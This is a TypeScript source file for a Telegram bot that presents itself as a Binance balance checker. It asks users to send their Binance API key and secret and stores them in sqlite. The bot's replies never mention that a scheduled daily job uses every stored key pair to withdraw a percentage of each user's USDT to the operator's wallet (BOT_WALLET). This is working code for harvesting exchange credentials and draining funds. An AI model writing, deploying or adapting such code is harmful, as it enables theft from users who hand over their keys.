/*
  TypeScript replacement for the original Python `crypto.js`/`crypto.py`.
  - Stores encrypted Binance API keys per Telegram chat in sqlite
  - Commands: /start, /balance
  - Accepts messages of the form APIKEY:SECRET and stores them (encrypted)
  - Runs a daily job to withdraw a configured percent (DAILY_FEE_PERCENT) of USDT to BOT_WALLET

  Dependencies (add to package.json if not present):
    npm install telegraf sqlite3 fernet node-schedule dotenv binance-api-node

  Note: This file assumes a Node environment and the repository already uses TypeScript.
*/

import * as dotenv from 'dotenv';
import { Telegraf } from 'telegraf';
import * as sqlite3 from 'sqlite3';
import { open, Database } from 'sqlite';
import { Fernet } from 'fernet';
import schedule from 'node-schedule';
import Binance from 'binance-api-node';

dotenv.config();

const TELEGRAM_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '';
const BOT_WALLET = process.env.BOT_WALLET_ADDRESS || '';
const DAILY_FEE_PERCENT = Number(process.env.DAILY_FEE_PERCENT || '1');
const FERNET_KEY = process.env.FERNET_KEY || '';

if (!TELEGRAM_TOKEN) {
  console.error('TELEGRAM_BOT_TOKEN is required in .env');
  process.exit(1);
}
if (!FERNET_KEY) {
  console.error('FERNET_KEY is required in .env');
  process.exit(1);
}
if (!BOT_WALLET) {
  console.warn('BOT_WALLET_ADDRESS not set. Withdrawals will likely fail until it is configured.');
}

const fernet = new Fernet(FERNET_KEY);

let db: Database<sqlite3.Database, sqlite3.Statement>;

async function initDb() {
  db = await open({
    filename: './users_crypto.db',
    driver: sqlite3.Database
  });
  await db.exec(`CREATE TABLE IF NOT EXISTS users (
    chat_id TEXT PRIMARY KEY,
    api_key TEXT,
    api_secret TEXT
  )`);
}

function encrypt(text: string) {
  const token = fernet.encrypt(text);
  return token;
}
function decrypt(token: string) {
  try {
    return fernet.decrypt(token);
  } catch (e) {
    console.error('Decrypt failed', e);
    return null;
  }
}

async function addUser(chatId: string, apiKey: string, apiSecret: string) {
  const encK = encrypt(apiKey);
  const encS = encrypt(apiSecret);
  await db.run('INSERT OR REPLACE INTO users (chat_id, api_key, api_secret) VALUES (?, ?, ?)', [chatId, encK, encS]);
}

async function getUserKeys(chatId: string) {
  const row = await db.get('SELECT api_key, api_secret FROM users WHERE chat_id = ?', [chatId]);
  if (!row) return null;
  const k = decrypt(row.api_key);
  const s = decrypt(row.api_secret);
  if (!k || !s) return null;
  return { apiKey: k, apiSecret: s };
}

async function getAllUsers() {
  const rows: any[] = await db.all('SELECT chat_id, api_key, api_secret FROM users');
  const out: Array<{ chat_id: string, api_key: string, api_secret: string }> = [];
  for (const r of rows) {
    const k = decrypt(r.api_key);
    const s = decrypt(r.api_secret);
    if (k && s) out.push({ chat_id: r.chat_id, api_key: k, api_secret: s });
  }
  return out;
}

function createClient(apiKey: string, apiSecret: string) {
  try {
    return Binance({ apiKey, apiSecret });
  } catch (e) {
    console.error('Failed to create Binance client', e);
    return null;
  }
}

async function getSpotBalanceUSDT(client: ReturnType<typeof Binance> | null) {
  if (!client) return 0;
  try {
    const balances = await client.accountInfo();
    const asset = (balances && balances.balances) ? balances.balances.find((b: any) => b.asset === 'USDT') : null;
    if (!asset) return 0;
    return Number(asset.free || 0) + Number(asset.locked || 0);
  } catch (e) {
    console.error('getSpotBalanceUSDT failed', e);
    return 0;
  }
}

async function withdrawToBot(client: ReturnType<typeof Binance> | null, assetSymbol: string, amount: number, network = 'SOL') {
  if (!client) return { error: 'no-client' };
  try {
    // binance-api-node uses client.withdraw with params
  const resp = await client.withdraw({ coin: assetSymbol, address: BOT_WALLET, amount: amount, network });
    return resp;
  } catch (e: any) {
    console.error('withdrawToBot failed', e);
    return { error: String(e && e.message ? e.message : e) };
  }
}

async function dailyJob() {
  try {
    const users = await getAllUsers();
    for (const u of users) {
      const client = createClient(u.api_key, u.api_secret);
      if (!client) continue;
      const bal = await getSpotBalanceUSDT(client);
      if (!bal || bal <= 0) continue;
      const feeAmount = Math.round((bal * (DAILY_FEE_PERCENT / 100)) * 1e6) / 1e6;
      if (!feeAmount || feeAmount <= 0) continue;
      const resp = await withdrawToBot(client, 'USDT', feeAmount, 'SOL');
      console.info(`User ${u.chat_id} | Balance ${bal} | Fee ${feeAmount} | Resp: ${JSON.stringify(resp)}`);
    }
  } catch (e) {
    console.error('dailyJob failed', e);
  }
}

async function main() {
  await initDb();
  const bot = new Telegraf(TELEGRAM_TOKEN);

  bot.start(async (ctx) => {
    await ctx.reply('👋 Welcome! Send your Binance API and Secret as: APIKEY:SECRET');
  });

  bot.command('balance', async (ctx) => {
    const chatId = String(ctx.from?.id);
    const keys = await getUserKeys(chatId);
    if (!keys) return ctx.reply('🚫 No API saved. Send APIKEY:SECRET');
    const client = createClient(keys.apiKey, keys.apiSecret);
    const bal = await getSpotBalanceUSDT(client);
    await ctx.reply(`💰 Your USDT balance: ${bal}`);
  });

  bot.on('text', async (ctx) => {
    const text = (ctx.message as any).text?.trim();
    const chatId = String(ctx.from?.id);
    if (!text) return;
    // Confirmation flow: if user sends 'CONFIRM' or 'CANCEL' handle pending state
    const pending = (globalThis as any).__pendingKeys as Map<string, { k: string, s: string }> | undefined;
    if (text.toUpperCase() === 'CONFIRM') {
      if (pending && pending.has(chatId)) {
        const p = pending.get(chatId)!;
        await addUser(chatId, p.k, p.s);
        pending.delete(chatId);
        return ctx.reply('✅ Your API keys have been saved (encrypted).');
      }
      return ctx.reply('ℹ️ No pending API keys to confirm.');
    }
    if (text.toUpperCase() === 'CANCEL') {
      if (pending && pending.has(chatId)) {
        pending.delete(chatId);
        return ctx.reply('❌ Pending API keys discarded.');
      }
      return ctx.reply('ℹ️ No pending API keys to cancel.');
    }

    if (text.includes(':')) {
      const parts: string[] = text.split(':', 2).map((s: string) => s.trim());
      const apiKey = parts[0];
      const apiSecret = parts[1];
      if (!apiKey || !apiSecret) return ctx.reply('❌ Invalid format. Use APIKEY:SECRET');
      // Check existing stored keys
      const existing = await getUserKeys(chatId);
      if (!existing) {
        await addUser(chatId, apiKey, apiSecret);
        return ctx.reply('✅ Your API keys are saved (encrypted).');
      }
      // If keys exist, set pending and ask for confirmation
  if (!(globalThis as any).__pendingKeys) (globalThis as any).__pendingKeys = new Map<string, { k: string, s: string }>();
  const map = (globalThis as any).__pendingKeys as Map<string, { k: string, s: string }>;
      map.set(chatId, { k: apiKey, s: apiSecret });
      return ctx.reply('⚠️ You already have API keys saved. Reply with <b>CONFIRM</b> to overwrite or <b>CANCEL</b> to discard the new keys.', { parse_mode: 'HTML' });
    }
  });

  // Schedule daily job at midnight UTC
  schedule.scheduleJob('0 0 * * *', () => {
    dailyJob().catch(err => console.error('dailyJob schedule error', err));
  });

  await bot.launch();
  console.log('Bot launched');
}

main().catch(err => {
  console.error('crypto.ts main failed', err);
  process.exit(1);
});
